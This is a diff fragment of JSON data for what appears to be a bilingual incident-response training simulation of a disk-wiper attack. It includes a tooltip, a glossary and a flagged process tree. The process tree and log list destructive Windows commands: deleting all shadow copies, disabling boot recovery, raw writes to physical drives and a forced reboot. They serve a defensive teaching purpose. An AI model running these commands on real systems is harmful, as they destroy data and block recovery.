+      "defTooltip": "shutdown /r /t 0 /f 명령은 와이퍼 공격의 최종 단계입니다. 이전에 vssadmin delete와 PhysicalDrive 쓰기가 감지되었다면, 이 시점에서 네트워크 케이블을 물리적으로 분리하여 포렌식 증거를 보존하세요.",
+      "defTooltipEn": "shutdown /r /t 0 /f is the final phase of wiper attacks. If vssadmin delete and PhysicalDrive writes were detected earlier, physically disconnect the network cable to preserve forensic evidence.",
+      "hackerLog": {
+        "title": "디스크 와이프 최종 요약",
+        "lines": [
+          { "text": "Disks Destroyed: 2 (2,340 GB)", "desc": "2개 디스크의 GPT + 시스템 파일 모두 파괴" },
+          { "text": "Recovery: Full hardware reimage required", "desc": "하드웨어 수준의 재설치만이 유일한 복구 방법" },
+          { "text": "shutdown /r /t 0 /f", "desc": "강제 재부팅 - 부팅 불가 상태로 전환" }
+        ]
+      },
+      "terms": [
+        { "term": "DFIR (Digital Forensics and Incident Response)", "desc": "디지털 포렌식과 사고 대응을 결합한 보안 분야입니다." },
+        { "term": "Shamoon", "desc": "Saudi Aramco를 공격한 디스크 와이퍼로, MBR을 파괴하고 파일을 덮어씁니다." },
+        { "term": "Hardware Reimage", "desc": "디스크를 완전히 포맷하고 OS를 처음부터 재설치하는 복구 작업입니다." }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "explorer.exe", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "powershell.exe (PID: 9500)", "depth": 1, "alert": true, "minStep": 0 },
+    { "name": "Get-Disk / Get-Partition", "depth": 2, "alert": false, "minStep": 0 },
+    { "name": "vssadmin.exe / bcdedit.exe / wbadmin.exe", "depth": 2, "alert": true, "minStep": 1 },
+    { "name": "vssadmin.exe delete shadows /all", "depth": 3, "alert": true, "minStep": 2 },
+    { "name": "bcdedit.exe /set recoveryenabled No", "depth": 3, "alert": true, "minStep": 2 },
+    { "name": "dd → \\\\.\\PhysicalDrive0 (GPT wipe)", "depth": 2, "alert": true, "minStep": 3 },
+    { "name": "dd → \\\\.\\PhysicalDrive1 (GPT wipe)", "depth": 2, "alert": true, "minStep": 4 },
+    { "name": "System file overwrite (SAM/SYSTEM/BCD)", "depth": 2, "alert": true, "minStep": 5 },
+    { "name": "shutdown /r /t 0 /f (forced reboot)", "depth": 2, "alert": true, "minStep": 6 }
+  ]
+}
